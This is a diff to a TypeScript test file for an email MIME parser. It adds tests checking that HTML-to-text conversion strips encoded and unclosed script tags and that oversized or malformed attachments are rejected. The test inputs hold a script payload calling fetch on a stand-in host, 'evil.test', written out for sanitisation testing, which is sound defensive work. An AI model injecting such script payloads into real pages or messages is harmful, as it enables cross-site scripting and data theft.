@@ -1,6 +1,7 @@
 import { describe, expect, it, vi } from 'vitest'
+import { readFileSync } from 'node:fs'
 
-import { MAX_EMAIL_HEADER_BYTES, MAX_EMAIL_MIME_DEPTH, MAX_RAW_EMAIL_BYTES, parseMimeContent } from '../../shared/leads/email/mime'
+import { htmlToText, MAX_EMAIL_HEADER_BYTES, MAX_EMAIL_MIME_DEPTH, MAX_RAW_EMAIL_BYTES, parseMimeContent } from '../../shared/leads/email/mime'
 
 const encoder = new TextEncoder()
 
@@ -42,7 +43,16 @@ describe('bounded MIME parsing', () => {
     fetchSpy.mockRestore()
   })
 
-  it('retains only bounded XML/ADF attachments for extraction', async () => {
+  it('drops encoded and unclosed active markup before it can reach extracted text', () => {
+    const encoded = '<p>Name: Alex Example</p>&lt;script&gt;fetch("https://evil.test/x")&lt;/script&gt;'
+    const unclosed = '<p>Name: Alex Example</p><script>fetch("https://evil.test/x")'
+    for (const hostile of [encoded, unclosed, readFileSync('test/fixtures/email-leads/hostile-html.html', 'utf8')]) {
+      expect(htmlToText(hostile)).toContain('Name: Alex Example')
+      expect(htmlToText(hostile)).not.toMatch(/script|fetch|evil\.test|invalid\.example/i)
+    }
+  })
+
+  it('rejects XML/ADF attachments after decode; the 2 MiB raw bound remains the allocation ceiling', async () => {
     const oversized = 'x'.repeat((256 * 1024) + 1)
     const parsed = await parseMimeContent(raw([
       'Content-Type: multipart/mixed; boundary=x', '', '--x', 'Content-Type: text/plain', '', 'hello', '--x',
@@ -50,5 +60,12 @@ describe('bounded MIME parsing', () => {
       'Content-Transfer-Encoding: base64', '', Buffer.from(oversized).toString('base64'), '--x--'
     ].join('\n')))
     expect(parsed.attachments).toHaveLength(0)
+  })
+
+  it('handles the sanitised malformed MIME fixture without extracting active content', async () => {
+    const malformed = readFileSync('test/fixtures/email-leads/malformed-mime.eml')
+    const parsed = await parseMimeContent(new Uint8Array(malformed))
+    expect(parsed.attachments).toEqual([])
+    expect(parsed.htmlText).toBeNull()
   })
 })
